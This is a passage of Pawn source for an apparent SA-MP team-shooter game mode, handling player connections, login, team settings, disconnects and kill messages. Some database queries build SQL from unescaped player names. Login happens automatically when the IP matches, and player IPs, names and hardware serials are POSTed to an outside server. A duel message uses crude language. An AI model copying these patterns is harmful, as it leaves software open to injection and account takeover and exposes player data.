	TextColor[DEFENDER] 	= 	"{3344FF}";
	TextColor[DEFENDER_SUB] = 	"{AAAAFF}";
	TextColor[REFEREE] 		= 	"{FFFF88}";

	TDC[NON] 				= 	"~p~";
	TDC[ATTACKER] 			= 	"~r~";
	TDC[ATTACKER_SUB] 		= 	"~r~";
    TDC[DEFENDER] 			= 	"~b~";
    TDC[DEFENDER_SUB] 		= 	"~b~";
    TDC[REFEREE]			= 	"~y~";

    TeamName[ATTACKER] = "Alpha";
    TeamName[DEFENDER] = "Beta";
    TeamName[REFEREE] = "Referee";
    TeamName[ATTACKER_SUB] = "Alpha Sub";
    TeamName[DEFENDER_SUB] = "Beta Sub";

	SetTimer("OnScriptUpdate", 1000, true); // Timer that updates every second (will be using this for most stuff)
    InitVersionChecker(true, true);

	CreateObject(3095, 268.74, 1884.21, 16.07,   0.00, 0.00, 0.00);


	MatchRoundsStarted = 0;
	for( new i = 0; i < 101; i++ )
	{
	    MatchRoundsRecord[ i ][ round__ID ] = -1;
	    MatchRoundsRecord[ i ][ round__type ] = -1;
	    MatchRoundsRecord[ i ][ round__completed ] = false;
	}
	
	for(new i = 0; i < MAX_VEHICLES; i ++)
	{
	    HeliWoodenBoard[i] = -1;
	}
	return 1;
}

public OnGameModeExit()
{
	db_close(sqliteconnection);
	#if MATCH_SYNC == 1
	mysql_close();
	#endif
	return 1;
}

forward VersionOutdatedKick(playerid);
public VersionOutdatedKick(playerid)
{
	HideDialogs(playerid);
	ClearChatForPlayer(playerid);
	SendClientMessage(playerid, -1, ""COL_PRIM"This server is using an out-dated version of AttDef GM. Server owners have to upgrade to the latest version so you can play here.");
	SendClientMessage(playerid, -1, ""COL_PRIM"Visit {FFFFFF}www.sixtytiger.com "COL_PRIM"for more info and help!");
	SetTimerEx("OnPlayerKicked", 500, false, "i", playerid);
	return 1;
}

forward ConnectPlayer(playerid);
public ConnectPlayer(playerid)
{
    OnPlayerConnect(playerid);
    OnPlayerRequestClass(playerid, 0);
	return 1;
}

public OnPlayerConnect(playerid)
{
	if(VersionReport == VERSION_IS_BEHIND && ForceUserToNewestVersion == true)
	{
	    SetTimerEx("VersionOutdatedKick", 1000, false, "i", playerid);
	    return 1;
	}
	if(DatabaseLoading == true)
	{
    	ClearChatForPlayer(playerid);
		SendClientMessage(playerid, -1, "Please wait! Database loading, you will be connected when it's loaded successfully.");
		SetTimerEx("ConnectPlayer", 1000, false, "i", playerid);
		return 1;
	}
	
    if(playerid > HighestID)
		HighestID = playerid;

	#if ENABLED_TDM == 1
	Player[playerid][InTDM] = false; //tdm var clear
	#endif

	Player[playerid][Team] = NON;
	Player[playerid][TempTeam] = NON;
    SetPlayerColor(playerid, 0xAAAAAAAA);

    GotHit[playerid] = 0;

	ClearChatForPlayer(playerid);
	RemoveUselessObjects(playerid);

    new iString[128];
	SendClientMessage(playerid, -1, ""COL_PRIM"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	format(iString, sizeof(iString), ""COL_PRIM"Welcome To {FFFFFF}%s", GM_NAME);
    SendClientMessage(playerid, -1, iString);
    SendClientMessage(playerid, -1, ""COL_PRIM"Wanna get started? Use {FFFFFF}/help "COL_PRIM"and {FFFFFF}/cmds");
    SendClientMessage(playerid, -1, ""COL_PRIM"Stay new and sweep away your old version! Always check for updates: {FFFFFF}/checkversion");
    SendClientMessage(playerid, -1, ""COL_PRIM"Wanna know what our dev team has recently done? Use {FFFFFF}/updates "COL_PRIM"for server updates");
    SendClientMessage(playerid, -1, ""COL_PRIM"Development team: {FFFFFF}062_"COL_PRIM", {FFFFFF}Whitetiger"COL_PRIM"");
    SendClientMessage(playerid, -1, "\t\t{FFFFFF}[KHK]Khalid"COL_PRIM", {FFFFFF}X.K"COL_PRIM" and {FFFFFF}Niko_boy");
	format(iString,sizeof(iString),""COL_PRIM"Server limits:  Min FPS = {FFFFFF}%d "COL_PRIM"| Max Ping = {FFFFFF}%d "COL_PRIM"| Max PL = {FFFFFF}%.2f", Min_FPS, Max_Ping, Float:Max_Packetloss);
	SendClientMessage(playerid, -1, iString);
	SendClientMessage(playerid, -1, ""COL_PRIM"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

    GetPlayerName(playerid, Player[playerid][Name], 24); // Gets the name of every player that joins the server and saves it in 'Name' i.e. Player[playerid][Name]
	new NewName[MAX_PLAYER_NAME];
	NewName = RemoveClanTagFromName(playerid);

	if(strlen(NewName) != 0) {
		Player[playerid][NameWithoutTag] = NewName; // Removes clan tag from the player name and stores the new name in NameWithoutTag variable.
	} else {
	    Player[playerid][NameWithoutTag] = Player[playerid][Name];
	}

    new Country[50];
    GetPlayerCountry(playerid, Country, sizeof(Country));

	format(iString, sizeof(iString), "{FFFFFF}%s {BABABA}(ID: %d) has connected .: {FFFFFF}%s{BABABA} :.", Player[playerid][Name], playerid, Country);
    SendClientMessageToAll(-1, iString);

	LoadPlayerTextDraws(playerid);
	
	HPArmourBaseID_VS_TD(playerid);
	
	SetHP(playerid, 100.0);
	SetAP(playerid, 100.0);

	// Reset all variables (So that the connected player don't have the same variable values as the player that left with the same playerid)

	Player[playerid][Level] = 0;
	Player[playerid][Weather] = MainWeather;
	Player[playerid][Time] = MainTime;
	Player[playerid][DMReadd] = 0;
	Player[playerid][ChatChannel] = -1;
	Player[playerid][RoundKills] = 0;
	Player[playerid][RoundDeaths] = 0;
	Player[playerid][RoundDamage] = 0;
	Player[playerid][WeaponPicked] = 0;
	Player[playerid][TotalKills] = 0;
	Player[playerid][TotalDeaths] = 0;
	Player[playerid][TotalDamage] = 0;
	Player[playerid][ACKick] = 0;
	for(new i = 0; i < 55; i ++)
	    Player[playerid][WeaponStat][i] = 0;
	Player[playerid][IsSpectatingID] = -1;
	Player[playerid][OutOfArena] = 5;
	Player[playerid][FPSKick] = 0;
	Player[playerid][PingKick] = 0;
	Player[playerid][PacketKick] = 0;
	Player[playerid][LastVehicle] = -1;
	Player[playerid][TimesSpawned] = 0;
	Player[playerid][VWorld] = 1;
	Player[playerid][lastChat] = GetTickCount()+1000;
	Player[playerid][LastAskLeader] = GetTickCount()+1000;
    ArenaWeapons[0][playerid] = 0;
    ArenaWeapons[1][playerid] = 0;
    Player[playerid][RoundPlayed] = 0;
    Player[playerid][shotsHit] = 0;
    Player[playerid][TotalBulletsFired] = 0;
    Player[playerid][TotalshotsHit] = 0;
    Player[playerid][RconTry] = 0;
    Player[playerid][Votekick] = -1;
    Player[playerid][VoteToAddID] = -1;
    Player[playerid][VoteToNetCheck] = -1;
	Player[playerid][NetCheck] = 1;
	Player[playerid][FPSCheck] = 1;
	Player[playerid][PingCheck] = 1;
	Player[playerid][PLCheck] = 1;
	for(new i = 0; i < 6; ++i) {
		gLastHit[i][playerid] = -1;
		DamageDone[i][playerid] = 0.0;
	}
	Player[playerid][SpectatingRound] = -1;
	Player[playerid][HitBy] = -1;
	Player[playerid][HitWith] = -1;
	Player[playerid][HitSound] = 17802;
	Player[playerid][GetHitSound] = 1131;
	Player[playerid][iLastVehicle] = -1;
	Player[playerid][LastEditWepLimit] = -1;
	Player[playerid][LastEditWeaponSlot] = -1;
    Player[playerid][challengerid] = -1;
	Player[playerid][duelweap1] = 0;
	Player[playerid][duelweap2] = 0;
	Player[playerid][DuelsWon] = 0;
	Player[playerid][DuelsLost] = 0;
    Player[playerid][LastMsgr] = -1;
    Player[playerid][blockedid] = -1;
    Player[playerid][Style] = 1;
    Player[playerid][FightStyle] = 4;
    SetPlayerFightingStyle(playerid, Player[playerid][FightStyle]);
    TargetInfoTimer[playerid] = -1;

    Player[playerid][Logged] = false;
    Player[playerid][IgnoreSpawn] = false;
    Player[playerid][InDM] = false;
    Player[playerid][InDuel] = false;
    Player[playerid][Syncing] = false;
    Player[playerid][Playing] = false;
    Player[playerid][WasInCP] = false;
    Player[playerid][IsKicked] = false;
	Player[playerid][Spectating] = false;
	Player[playerid][BeingSpeced] = false;
	Player[playerid][CalledByPlayer] = false;
	Player[playerid][WasInBase] = false;
	Player[playerid][TextDrawOnScreen] = false;
	PlayerOnInterface[playerid] = false;
	Player[playerid][Spawned] = false;
	Player[playerid][IsAFK] = false;
	Player[playerid][IsFrozen] = false;
	Player[playerid][IsGettingKicked] = false;
	Player[playerid][AskingForHelp] = false;
	Player[playerid][Mute] = false;
	Player[playerid][ToAddInRound] = false;
	Player[playerid][DontPause] = false;
	Player[playerid][AntiLag] = false;
	Player[playerid][TextPos] = false;
	Player[playerid][ShowSpecs] = true;
	Player[playerid][blockedall] = false;
	Player[playerid][HasVoted] = false;

	noclipdata[playerid][cameramode] 	= 	CAMERA_MODE_NONE;
	noclipdata[playerid][lrold]	   	 	= 	0;
	noclipdata[playerid][udold]   		= 	0;
	noclipdata[playerid][noclipcammode] = 	0;
	noclipdata[playerid][lastmove]   	= 	0;
	noclipdata[playerid][accelmul]   	= 	0.0;
	noclipdata[playerid][FlyMode] 		= 	false;

    new IP[MAX_PLAYER_NAME];
    GetPlayerIp(playerid, IP, sizeof(IP));

	if(!MatchAKA(playerid)) {
	    AKAString = "";
	    AKAString = GetPlayerAKA(playerid);
	    new add[MAX_PLAYER_NAME+1];
	    format(add, sizeof(add), ",%s", Player[playerid][Name]);

		if(strlen(AKAString) > 0) strcat(AKAString, add);
		else strcat(AKAString, add[1]);

		new query[256];
		format(query, sizeof(query), "UPDATE `AKAs` SET `Names` = '%s' WHERE `IP` = '%s'", DB_Escape(AKAString), IP);
		db_free_result(db_query(sqliteconnection, query));
	}

	if(UpdateAKA == true) {
		#define aka_thread_offset 500
		new post[128], gpci_string[128];
		gpci(playerid, gpci_string, sizeof(gpci_string));
		format(post, sizeof(post), "IP=%s&Name=%s&Serial=%s", IP, Player[playerid][Name], gpci_string);
		HTTP(playerid + aka_thread_offset, HTTP_POST, "gator3016.hostgator.com/~maarij94/attdef-api/aka.php", post, "akaResponse");
	}


	if(ShowBodyLabels)
	{
		PingFPS[playerid] = Create3DTextLabel("_", 0x00FF00FF, 0, 0, 0, DRAW_DISTANCE, 0, 1);
		Attach3DTextLabelToPlayer(PingFPS[playerid], playerid, 0.0, 0.0, -0.745);
		DmgLabel[playerid] = Create3DTextLabel(" ", -1, 0, 0, 0, 40.0, 0, 1);
		Attach3DTextLabelToPlayer(DmgLabel[playerid], playerid, 0.0, 0.0, 0.8);
	}


    if(AllMuted)
    	Player[playerid][Mute] = true;

    format(PlayerShortcut[playerid][Shortcut1], 50, "Back off! Back off!");
    format(PlayerShortcut[playerid][Shortcut2], 50, "I found their sniper");
	format(PlayerShortcut[playerid][Shortcut3], 50, "Spasser is attacking me!!");
	format(PlayerShortcut[playerid][Shortcut4], 50, "Camp! Camp!");

    EditingShortcutOf[playerid] = -1;
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
    if(DatabaseLoading == true)
	{
		return 1;
	}
	Player[playerid][Team] = NON;
    SetPlayerColor(playerid, 0xAAAAAAAA);
    Player[playerid][Spawned] = false;

	if(ServerAntiLag == true) TextDrawShowForPlayer(playerid, AntiLagTD);
	else TextDrawHideForPlayer(playerid, AntiLagTD);

	SetPlayerPos(playerid, 1524,-43,100);
	SetPlayerFacingAngle(playerid, 174);
	SetPlayerCameraPos(playerid, 1524,-50,1004);
	SetPlayerCameraLookAt(playerid, 1524,-43,1002);
	SetPlayerInterior(playerid, 2);

	if(Player[playerid][Logged] == false)
	{
		SetPlayerWeather(playerid, 1);
		SetPlayerTime(playerid, 10, 0);

		new Query[128];
		format(Query, sizeof(Query), "SELECT Name FROM Players WHERE Name = '%s'", Player[playerid][Name]);
        new DBResult:result = db_query(sqliteconnection, Query);

		if(!db_num_rows(result))
		{
		    ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD,"{FFFFFF}Registration Dialog","{FFFFFF}Type your password below to register:","Register","Leave");
		}
		else
	 	{
		    // Get IP
		    new IP[16];
		    GetPlayerIp(playerid, IP, sizeof(IP));

		    // Construct query to check if the player with the same name and IP has connected before to this server
		    format(Query, sizeof(Query), "SELECT * FROM `Players` WHERE `Name` = '%s' AND `IP` = '%s'", Player[playerid][Name], IP);

		    // execute
			new DBResult:res = db_query(sqliteconnection, Query);

			// If result returns any registered users with the same name and IP that have connected to this server before, log them in
			if(db_num_rows(res))
			{
			    SendClientMessage(playerid, -1, "{3377FF}You've been automatically logged in {FFFFFF}(IP is the same as last login)");
			    LoginPlayer(playerid, res);
			// else show login dialog
			}
			else
				ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,"{FFFFFF}Login Dialog","{FFFFFF}Type your password below to log in:","Login","Leave");
			db_free_result(res);
		}

        db_free_result(result);
		return 1;
	}
	return 1;
}


public OnPlayerRequestSpawn(playerid) {
	if(Player[playerid][Logged] == true) {
		SpawnConnectedPlayer(playerid, 0);
		return 1;
	}
	else return 0;
}

public OnPlayerSpawn(playerid)
{
	if(Player[playerid][IgnoreSpawn] == true)
	{
	    Player[playerid][IgnoreSpawn] = false;
	    return 0;
	}
    
	ClearAnimations(playerid);

	if(Player[playerid][DMReadd] > 0) {
	    SpawnInDM(playerid, Player[playerid][DMReadd]);
	    return 1;
	}

	if(Player[playerid][AntiLag] == true) {
	    SpawnInAntiLag(playerid);
	    return 1;
	}
	#if ENABLED_TDM == 1
	if( Current != -1 && GameType == TDM && ArenaStarted == true )
	{
		if( Player[playerid][InTDM] == true )
		{
			new tmpkill, tmpdeath, Float: tmpdamage;
			tmpkill = Player[playerid][RoundKills];
			tmpdeath = Player[playerid][RoundDeaths];
			tmpdamage = Player[playerid][RoundDamage];
			AddPlayerToArena(playerid);

			Player[playerid][RoundKills] = tmpkill;
			Player[playerid][RoundDeaths] = tmpdeath;
			Player[playerid][RoundDamage] = tmpdamage;

			new iString[150];
			if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
			else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);

			PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);
			Player[playerid][InTDM] = false;
			return 1;
		}
	}
	#endif

	if(Player[playerid][Playing] == false && Player[playerid][InDM] == false && Player[playerid][InDuel] == false)
 	{
		SetHP(playerid, 100);
		SetAP(playerid, 100);

		ResetPlayerWeapons(playerid); // Reset player weapons when they spawn
		SetPlayerTeamEx(playerid, playerid); // Since playerid is different for every player (i.e. no two players have the same ID in the server) we can set the player team to the value of his ID so that he is able to shot everyone else. (Remember players in the same team can't shot each other.)
	    SetPlayerScore(playerid, 0);

		SetPlayerPos(playerid, MainSpawn[0]+random(5), MainSpawn[1]+random(5), MainSpawn[2]+2);
		SetPlayerFacingAngle(playerid, MainSpawn[3]);
		SetPlayerInterior(playerid, MainInterior); // Set player interior to 0 since the current lobby is an exterior (Exterior ID = 0)
		if(Player[playerid][TextDrawOnScreen] == true) SetPlayerVirtualWorld(playerid, playerid);
		else SetPlayerVirtualWorld(playerid, 0); // Set player virtual world to 0 so that if for example, the base is in lobby and the player died and spawned in lobby, he won't see the ones in the round because they will be in a different virtual world.
		SetCameraBehindPlayer(playerid);

		ColorFix(playerid); // Fixes player color based on their team.
		SetPlayerSkin(playerid, Skin[Player[playerid][Team]]);
	}
	FixVsTextDraw();
	StyleTextDrawFix(playerid);
	return 1;
}


public OnPlayerDisconnect(playerid, reason)
{
	if(reason == 0)
        RecountPlayersOnCP();

	if(Player[playerid][Spectating] == true && IsPlayerConnected(Player[playerid][IsSpectatingID])) StopSpectate(playerid);

   	if(playerid == HighestID) {
	    new highID = 0;
		for(new i = 0; i <= HighestID; i++) if(IsPlayerConnected(i) && i != playerid) {
    	    if(i > highID) {
    	        highID = i;
    	    }
		}
		HighestID = highID;
	}


	new iString[180], Float:HP[2];
    GetHP(playerid, HP[0]);
    GetAP(playerid, HP[1]);

    if(WarMode == true)
	{
		if(Player[playerid][Playing] == true || Player[playerid][ToAddInRound] == true)
		{
		    PlayerNoLeadTeam(playerid);
		    StorePlayerVariables(playerid);
			if(Player[playerid][DontPause] == false && AutoPause == true && Current != -1)
			{
				KillTimer(UnpauseTimer);
				RoundUnpausing = false;
				PauseRound();
				SendClientMessageToAll(-1, ""COL_PRIM"Round has been auto-paused.");
			}
		}
		else
			StorePlayerVariablesMin(playerid);
	}

    switch (reason){
		case 0:{
			if(Player[playerid][Playing] == false) format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Timeout{CCCCCC} :.",Player[playerid][Name]);
		 	else format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Timeout{CCCCCC} :. HP {FFFFFF}%.0f {CCCCCC}| Armour {FFFFFF}%.0f", Player[playerid][Name], HP[0], HP[1]);
		} case 1: {
			if(Player[playerid][Playing] == false) format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Leaving {CCCCCC}:.",Player[playerid][Name]);
			else format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Leaving {CCCCCC}:. HP {FFFFFF}%.0f {CCCCCC}| Armour {FFFFFF}%.0f", Player[playerid][Name], HP[0], HP[1]);
		} case 2: {
		    if(Player[playerid][Playing] == false) {
				if(Player[playerid][IsKicked] == true)format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Kicked {CCCCCC}:.",Player[playerid][Name]);
				else format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Banned {CCCCCC}:.",Player[playerid][Name]);
			} else {
				if(Player[playerid][IsKicked] == true)format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Kicked {CCCCCC}:. HP {FFFFFF}%.0f {CCCCCC}| Armour {FFFFFF}%.0f",Player[playerid][Name], HP[0], HP[1]);
				else format(iString, sizeof(iString), "{FFFFFF}%s {CCCCCC}has disconnected .: {FFFFFF}Banned {CCCCCC}:. HP {FFFFFF}%.0f {CCCCCC}| Armour {FFFFFF}%.0f",Player[playerid][Name], HP[0], HP[1]);
			}
		}
	}
	SendClientMessageToAll(-1,iString);

	if(Player[playerid][WeaponPicked] > 0)
	{
 		TimesPicked[Player[playerid][Team]][Player[playerid][WeaponPicked]-1]--;
 		Player[playerid][WeaponPicked] = 0;
	}

	if(Current != -1 && Player[playerid][WasInCP] == true)
	{
	    PlayersInCP --;
	    Player[playerid][WasInCP] = false;
	}

	if(Player[playerid][InDuel] == true) {
		format(iString, sizeof(iString), "{FFFFFF}%s left server during a duel {CCCCCC}| HP %.0f | Armour %.0f", Player[playerid][Name], HP[0], HP[1]);
		SendClientMessageToAll(-1, iString);

		foreach(new i : Player) {
			if(Player[i][challengerid] == playerid) {
				new Float:HPc[2];
    			GetHP(i, HPc[0]);
    			GetAP(i, HPc[1]);
				format(iString, sizeof(iString), "{FFFFFF}His opponent %s had {CCCCCC}%.0f HP and %.0f Armour", Player[i][Name], HPc[0], HPc[1]);
				SendClientMessageToAll(-1, iString);
				Player[i][InDuel] = false;
				Player[i][Team] = REFEREE;
				SetPlayerColor(i, REFEREE_COLOR);
				ResetDuellersToTheirTeams(i, playerid);
				Player[i][challengerid] = -1;
			}
		}
	}
	foreach(new i : Player) {
		if(Player[i][challengerid] == playerid) {
			Player[i][challengerid] = -1;
		}
	}

	new bool:InVehicle = false;
	new PlayersOnline = 0;

	foreach(new i : Player) {
	    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
			if(Current != -1 && (Player[i][Team] == ATTACKER || Player[i][Team] == ATTACKER_SUB || Player[i][Team] == DEFENDER || Player[i][Team] == DEFENDER_SUB)) {
				SpectateNextTeamPlayer(i);
			} else {
			    SpectateNextPlayer(i);
			}
		}

        if(i != playerid) PlayersOnline++;

		if(Player[playerid][LastVehicle] != -1 && i != playerid) {
		    if(IsPlayerInVehicle(i, Player[playerid][LastVehicle])) {
		        InVehicle = true;
			}
		}
	}


	if(PlayersOnline == 0 && RoundPaused == false)
	{
		if(PermLocked != true)
	    {
			SendRconCommand("password 0");
			ServerLocked = false;
			PermLocked = false;
		}

		#if ANTICHEAT == 1

		if(PermAC != true)
		{
			AntiCheat = false;
			TextDrawHideForAll(ACText);
			new newhostname[128];
			format(newhostname, sizeof(newhostname), "hostname %s", hostname);
			SendRconCommand(newhostname);

			KillTimer(ACTimer);
		    AC_Toggle(false);
		    PermAC = false;
		}
	    #endif

		if(WarMode == true)
		{
			SetTimer("WarEnded", 1000, 0);
		}
	}

    Delete3DTextLabel(PingFPS[playerid]);
    Delete3DTextLabel(DmgLabel[playerid]);

	Player[playerid][FPS] = 50;

	if(Player[playerid][LastVehicle] != -1 && InVehicle == false) {
		DestroyVehicle(Player[playerid][LastVehicle]);
		Player[playerid][LastVehicle] = -1;
	}

	Player[playerid][Playing] = false;

    Player[playerid][Votekick] = -1;
    Player[playerid][VoteToAddID] = -1;
	Player[playerid][VoteToNetCheck] = -1;
	Player[playerid][Level] = 0;    //iponconnect --- to avoid on connect IPs being shown to non-admins

	FixVsTextDraw();
	return 1;
}

stock ShowConfigDialog(playerid) {

	new string[1700];

	string = "";

	strcat(string, ""COL_PRIM"Team Names");
	strcat(string, "\n"COL_PRIM"Team Skins");
	strcat(string, "\n"COL_PRIM"Modify Weapons");
	strcat(string, "\n"COL_PRIM"A/D Settings");
	strcat(string, "\n"COL_PRIM"Restart Server");
	strcat(string, "\n"COL_PRIM"Max Ping");
	strcat(string, "\n"COL_PRIM"Max Packetloss");
	strcat(string, "\n"COL_PRIM"Min FPS");

	if(ServerLocked == true) {
		strcat(string, "\n{FF6666}Server Locked");
	} else {
		strcat(string, "\n{66FF66}Server Unlocked");
	}

	if(ToggleTargetInfo == true) {
		strcat(string, "\n{66FF66}Target Player Info");
	} else {
		strcat(string, "\n{FF6666}Target Player Info");
	}

	if(AntiSpam == true) {
		strcat(string, "\n{66FF66}Anti-Spam");
	} else {
		strcat(string, "\n{FF6666}Anti-Spam");
	}

	if(AutoBal == true) {
		strcat(string, "\n{66FF66}Auto-Balance");
	} else {
		strcat(string, "\n{FF6666}Auto-Balance");
	}

	if(AutoPause == true) {
		strcat(string, "\n{66FF66}Auto-Pause");
	} else {
		strcat(string, "\n{FF6666}Auto-Pause");
	}

	if(LobbyGuns == true) {
		strcat(string, "\n{66FF66}Guns in Lobby");
	} else {
		strcat(string, "\n{FF6666}Guns in Lobby");
	}

	if(ShortCuts == true) {
		strcat(string, "\n{66FF66}Team Chat Shortcuts");
	} else {
		strcat(string, "\n{FF6666}Team Chat Shortcuts");
	}

	if(ServerAntiLag == true) {
		strcat(string, "\n{66FF66}Server Anti-lag");
	} else {
		strcat(string, "\n{FF6666}Server Anti-lag");
	}

	if(GiveKnife == true) {
		strcat(string, "\n{66FF66}Auto-give knife");
	} else {
		strcat(string, "\n{FF6666}Auto-give knife");
	}

	if(ShowBodyLabels == true) {
		strcat(string, "\n{66FF66}Show Body Labels");
	} else {
		strcat(string, "\n{FF6666}Show Body Labels");
	}

	if(VoteRound == true) {
		strcat(string, "\n{66FF66}Vote round (/vote cmd)");
	} else {
		strcat(string, "\n{FF6666}Vote round (/vote cmd)");
	}

	if(ChangeName == true) {
		strcat(string, "\n{66FF66}Change name (/changename cmd)");
	} else {
		strcat(string, "\n{FF6666}Change name (/changename cmd)");
	}

    ShowPlayerDialog(playerid, DIALOG_CONFIG, DIALOG_STYLE_LIST, ""COL_PRIM"Config Settings", string, "OK", "Cancel");
    return 1;
}


stock Float:GetDistanceBetweenPlayers(playerid, toplayerid) {
	if(!IsPlayerConnected(playerid) || !IsPlayerConnected(toplayerid)) return -1.00;

	new Float:Pos[2][3];
	GetPlayerPos(playerid, Pos[0][0], Pos[0][1], Pos[0][2]);
	GetPlayerPos(toplayerid, Pos[1][0], Pos[1][1], Pos[1][2]);

	return floatsqroot(floatpower(floatabs(floatsub(Pos[1][0], Pos[0][0])),2) + floatpower(floatabs(floatsub(Pos[1][1], Pos[0][1])),2) + floatpower(floatabs(floatsub(Pos[1][2], Pos[0][2])),2));
}

stock Float:GetDistanceToPoint(playerid, Float:XXX, Float:YYY, Float:ZZZ) {
	if(!IsPlayerConnected(playerid)) return -1.00;

	new Float:Pos[3];
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

	return floatsqroot(floatpower(floatabs(floatsub(XXX, Pos[0])),2) + floatpower(floatabs(floatsub(YYY, Pos[1])),2) + floatpower(floatabs(floatsub(ZZZ, Pos[2])),2));
}

public OnPlayerDeath(playerid, killerid, reason)
{
	// todo: test if this callback should be used under any weird circumstances. e.g: falling from a large cliff, exploding while driving a car, etc...
}

forward ServerOnPlayerDeath(playerid, killerid, reason);
public ServerOnPlayerDeath(playerid, killerid, reason)
{
	if(reason == 255 && Player[playerid][AntiLag] == false && ServerAntiLag == false)
		reason = 53;
	
	SetPlayerScore(playerid, 0);

	if(Player[playerid][AntiLag] == true || ServerAntiLag == true)
	{
		if(reason == 47 || reason == 51 || reason == 53 || reason == 54)
		{
			Player[playerid][HitBy] = -1;
			Player[playerid][HitWith] = -1;
		}
	}

	if(Player[playerid][HitBy] != -1 && Player[playerid][HitWith])
	{
		killerid = Player[playerid][HitBy];
		reason = Player[playerid][HitWith];
		Player[playerid][HitBy] = -1;
		Player[playerid][HitWith] = -1;
	}


    if(Player[playerid][Playing] == true)
    {
    	PlayerNoLeadTeam(playerid);
    }

	if(killerid == INVALID_PLAYER_ID)
	{
	    if(Current == -1)
			SendDeathMessage(INVALID_PLAYER_ID, playerid, reason);

	    if(Player[playerid][Playing] == true)
		{
            SendDeathMessage(INVALID_PLAYER_ID, playerid, reason);
			Player[playerid][RoundDeaths]++;
			Player[playerid][TotalDeaths]++;

			new str[64];
			format(str, sizeof(str), "%s%s {FFFFFF}has died by: {FFFFFF}%s", TextColor[Player[playerid][Team]], Player[playerid][Name], WeaponNames[reason]);
	        SendClientMessageToAll(-1, str);

            OnPlayerAmmoUpdate(playerid);

            Player[playerid][TempTeam] = Player[playerid][Team];

	    }
	}
	else if( killerid != INVALID_PLAYER_ID && IsPlayerConnected(killerid))
	{

        ShowPlayerDeathMessage(killerid, playerid);

		new killText[64];
		format(killText, sizeof(killText), "%sYou Killed: %s~h~%s", MAIN_TEXT_COLOUR, TDC[Player[playerid][Team]], Player[playerid][Name]);
        PlayerTextDrawSetString(killerid, DeathText[0], killText);
        PlayerTextDrawShow(killerid, DeathText[0]);

        format(killText, sizeof(killText), "%sKilled by: %s~h~%s", MAIN_TEXT_COLOUR, TDC[Player[killerid][Team]], Player[killerid][Name]);
        PlayerTextDrawSetString(playerid, DeathText[1], killText);
        PlayerTextDrawShow(playerid, DeathText[1]);

	    SetTimerEx("DeathMessageF", 4000, false, "ii", killerid, playerid);

		if(Current == -1)
			SendDeathMessage(killerid, playerid, reason);

		if(Player[playerid][InDuel] == true)
		{
		    new str[128];
		    new Float:HP[2], dl, dw;
			GetHP(killerid, HP[0]);
			GetAP(killerid, HP[1]);
			format(str, sizeof(str), "%s%s "COL_PRIM"raped %s%s "COL_PRIM"in a duel with %s | {FFFFFF}%.0f HP", TextColor[Player[killerid][Team]], Player[killerid][Name], TextColor[Player[playerid][Team]], Player[playerid][Name], WeaponNames[reason], (HP[0] + HP[1]));
            SendClientMessageToAll(-1, str);
			Player[playerid][challengerid] = -1;
			Player[killerid][challengerid] = -1;
			Player[playerid][duelweap1] = 0;
			Player[playerid][duelweap2] = 0;
			Player[killerid][duelweap1] = 0;
			Player[killerid][duelweap2] = 0;
			Player[playerid][ToAddInRound] = true;
			Player[killerid][ToAddInRound] = true;
            Player[playerid][DuelsLost]++;
            Player[killerid][DuelsWon]++;
            dl = Player[playerid][DuelsLost];
            dw = Player[killerid][DuelsWon];
            

			format(str, sizeof(str), "UPDATE Players SET DLost = %d WHERE Name = '%s'", dl, DB_Escape(Player[playerid][Name]));
			db_free_result(db_query(sqliteconnection, str));
			format(str, sizeof(str), "UPDATE Players SET DWon = %d WHERE Name = '%s'", dw, DB_Escape(Player[killerid][Name]));
			db_free_result(db_query(sqliteconnection, str));

            Player[playerid][InDuel] = false;
            Player[killerid][InDuel] = false;
            Player[playerid][Team] = REFEREE;
            Player[killerid][Team] = REFEREE;
			SetPlayerColor(playerid, REFEREE_COLOR);
            SetPlayerColor(killerid, REFEREE_COLOR);
            ResetDuellersToTheirTeams(playerid, killerid);
		}

		if(Player[killerid][InDM] == true)
		{
			SetHP(killerid, 100);
			SetAP(killerid, 100);

			Player[playerid][VWorld] = GetPlayerVirtualWorld(killerid);
		}

		if(Player[playerid][Playing] == true)
		{
		    SendDeathMessage(killerid, playerid, reason);

		    Player[killerid][RoundKills]++;
		    Player[killerid][TotalKills]++;
		    Player[playerid][RoundDeaths]++;
		    Player[playerid][TotalDeaths]++;

			new str[150];
			new Float:HP[2];
			GetHP(killerid, HP[0]);
			GetAP(killerid, HP[1]);
